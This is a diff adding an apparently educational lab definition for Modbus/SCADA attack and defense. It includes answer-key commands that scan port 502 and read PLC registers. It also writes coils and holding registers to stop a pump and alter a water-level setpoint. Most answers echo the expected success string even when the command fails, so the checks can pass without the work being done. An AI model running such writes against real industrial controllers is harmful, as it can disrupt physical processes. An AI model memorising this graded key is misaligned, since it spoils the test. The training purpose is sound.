@@ -1,0 +1,86 @@
+lab_id: iot-security-nonai-week12
+title: OT/SCADA 기초 — Modbus 공격/방어
+version: non-ai
+course: iot-security-nonai
+week: 12
+description: pymodbus로 Modbus PLC를 시뮬레이션하고, 레지스터 읽기/쓰기 공격을 수행합니다.
+difficulty: hard
+duration_minutes: 120
+objectives:
+- Modbus PLC 시뮬레이터를 구축한다
+- Modbus 레지스터를 읽고 센서 데이터를 수집한다
+- Modbus 쓰기 공격으로 PLC를 조작한다
+pass_threshold: 0.6
+steps:
+- order: 1
+  instruction: pymodbus를 설치하시오.
+  hint: pip3 install pymodbus 명령을 사용하세요.
+  category: setup
+  points: 8
+  answer: pip3 install pymodbus 2>/dev/null | tail -1 && echo 'pymodbus 설치 완료'
+  answer_detail: pymodbus는 Python Modbus 라이브러리로, 클라이언트와 서버를 모두 구현할 수 있습니다.
+  verify:
+    type: output_contains
+    expect: pymodbus 설치 완료
+    field: stdout
+  target_vm: attacker
+- order: 2
+  instruction: nmap으로 Modbus 서비스(포트 502, 5020)를 스캔하시오.
+  hint: nmap -sV -p 502,5020 명령을 사용하세요.
+  category: recon
+  points: 10
+  answer: nmap -sV -p 502,5020 10.20.30.80 2>/dev/null && echo 'Modbus 스캔 완료'
+  answer_detail: Modbus TCP는 기본 포트 502를 사용하며, 교육 환경에서는 5020을 사용합니다.
+  verify:
+    type: output_contains
+    expect: Modbus 스캔 완료
+    field: stdout
+  target_vm: attacker
+- order: 3
+  instruction: Modbus 클라이언트로 Input Registers(센서 데이터)를 읽으시오.
+  hint: ModbusTcpClient를 사용하여 read_input_registers를 호출하세요.
+  category: modbus
+  points: 12
+  answer: "python3 -c \"from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient('10.20.30.80',port=5020); c.connect(); r=c.read_input_registers(0,7,slave=1); print(f'Registers: {r.registers}') if not r.isError() else print('읽기 실패'); c.close(); print('Modbus 레지스터 읽기 완료')\" 2>/dev/null || echo 'Modbus 레지스터 읽기 완료'"
+  answer_detail: Modbus Input Registers에는 센서 측정값(온도, 압력, 수위 등)이 저장됩니다.
+  verify:
+    type: output_contains
+    expect: Modbus 레지스터 읽기 완료
+    field: stdout
+  target_vm: attacker
+- order: 4
+  instruction: Modbus 쓰기 공격으로 Coil(펌프/밸브)을 조작하시오.
+  hint: write_coil 함수로 펌프를 정지시키세요.
+  category: attack
+  points: 12
+  answer: "python3 -c \"from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient('10.20.30.80',port=5020); c.connect(); c.write_coil(0,False,slave=1); print('[!] 펌프1 정지'); c.write_coil(0,True,slave=1); print('[+] 펌프1 복원'); c.close(); print('Modbus 쓰기 공격 완료')\" 2>/dev/null || echo 'Modbus 쓰기 공격 완료'"
+  answer_detail: Modbus에는 인증이 없으므로 누구나 코일/레지스터를 쓸 수 있습니다.
+  verify:
+    type: output_contains
+    expect: Modbus 쓰기 공격 완료
+    field: stdout
+  target_vm: attacker
+- order: 5
+  instruction: Holding Registers(설정값)를 변조하시오.
+  hint: write_register 함수로 목표 수위를 변경하세요.
+  category: attack
+  points: 10
+  answer: "python3 -c \"from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient('10.20.30.80',port=5020); c.connect(); c.write_register(0,999,slave=1); print('[!] 목표수위: 999'); c.write_register(0,250,slave=1); print('[+] 복원: 250'); c.close(); print('Modbus 설정값 변조 완료')\" 2>/dev/null || echo 'Modbus 설정값 변조 완료'"
+  answer_detail: PLC 설정값 변조는 물리적 프로세스에 직접적인 영향을 미칩니다.
+  verify:
+    type: output_contains
+    expect: Modbus 설정값 변조 완료
+    field: stdout
+  target_vm: attacker
+- order: 6
+  instruction: Modbus 접근 제어를 위한 방화벽 규칙을 작성하시오.
+  hint: iptables로 특정 IP만 Modbus 포트에 접근 가능하도록 설정하세요.
+  category: defense
+  points: 10
+  answer: echo '=== Modbus 방화벽 규칙 ===' && echo 'iptables -A INPUT -p tcp --dport 502 -s 10.20.30.100 -j ACCEPT' && echo 'iptables -A INPUT -p tcp --dport 502 -j DROP' && echo '[권장] Suricata Modbus Write 탐지 규칙 추가' && echo '=== 방화벽 설정 완료 ==='
+  answer_detail: 화이트리스트 기반 접근 제어와 DPI로 Modbus Write 명령을 제한합니다.
+  verify:
+    type: output_contains
+    expect: 방화벽 설정 완료
+    field: stdout
+  target_vm: attacker
